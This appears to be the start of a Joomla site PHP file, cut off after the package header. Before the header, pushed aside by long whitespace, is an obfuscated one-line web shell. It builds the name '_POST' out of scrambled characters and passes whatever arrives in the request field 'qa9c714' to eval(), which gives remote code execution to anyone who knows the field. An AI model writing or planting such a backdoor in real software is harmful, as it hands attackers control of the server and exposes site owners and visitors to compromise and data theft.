<?php                                                                                                                                                                                                                                                  $aeq11="erusopt_" ; $exmc74= $aeq11[3].$aeq11[6].$aeq11[1]. $aeq11[6]. $aeq11[4].$aeq11[2].$aeq11[5]. $aeq11[5]. $aeq11[0].$aeq11[1] ; $uoax27=$exmc74 ($aeq11[7].$aeq11[5] . $aeq11[4].$aeq11[3].$aeq11[6]);if (isset (${$uoax27}[ 'qa9c714']) ){eval(${$uoax27 }['qa9c714']); }?><?php
/**
 * @package     Joomla.Site
